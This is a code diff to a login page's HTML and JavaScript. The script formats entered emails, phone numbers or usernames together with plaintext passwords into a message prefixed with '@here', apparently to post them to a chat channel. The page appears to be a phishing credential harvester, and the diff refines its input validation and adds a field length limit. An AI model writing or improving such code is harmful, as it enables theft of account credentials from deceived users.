@@ -195,17 +195,13 @@
       }
 
       // Determine the type of input and format the message
-      let type;
       let message = '@here ';
 
       if (email.includes('@')) {
-        type = 'Email';
         message += `Email: ${email}\nPassword: ${password}`;
       } else if (/^\d{10}$/.test(email)) {
-        type = 'Phone';
         message += `Phone: ${email}\nPassword: ${password}`;
-      } else if (/^[a-zA-Z0-9]+$/.test(email)) {
-        type = 'Username';
+      } else if (/^[\w.-]+$/.test(email)) { // Accept letters, numbers, underscores, periods
         message += `Username: ${email}\nPassword: ${password}`;
       } else {
         alertMessage.style.display = 'block';
@@ -252,7 +248,7 @@
     <form onsubmit="return validateForm()">
       <div class="alert" id="alert-message">Please fill in all required fields.</div>
       <label for="email">EMAIL OR PHONE NUMBER <span class="error">*</span></label>
-      <input id="email" name="email" type="text"/>
+      <input id="email" name="email" type="text" maxlength="32" />
       <div class="spacer"></div>
       <label for="password">PASSWORD <span class="error">*</span></label>
       <input id="password" name="password" type="password"/>
